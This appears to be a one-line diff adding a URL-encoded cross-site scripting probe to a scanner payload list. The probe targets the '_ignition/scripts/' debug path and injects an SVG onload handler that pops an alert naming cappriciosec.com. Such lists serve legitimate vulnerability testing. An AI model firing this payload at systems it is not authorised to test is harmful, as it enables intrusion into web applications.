@@ -1,0 +1,1 @@
+_ignition/scripts/--%3E%3Csvg%20onload=alert%28'cappriciosec.com'%29%3E
